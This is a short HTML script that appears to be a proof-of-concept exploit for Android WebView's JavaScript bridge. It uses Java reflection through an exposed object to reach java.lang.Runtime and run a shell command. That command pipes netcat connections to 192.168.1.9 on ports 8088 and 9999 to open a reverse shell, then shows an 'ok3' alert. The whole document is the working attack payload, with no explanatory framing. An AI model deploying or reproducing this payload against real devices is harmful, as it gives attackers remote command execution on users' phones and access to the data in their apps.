<script>
function execute(cmdArgs)
{
return XXX.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
}
execute(["/system/bin/sh","-c","nc 192.168.1.9 8088|/system/bin/sh|nc 192.168.1.9 9999"]);
alert("ok3");
</script>
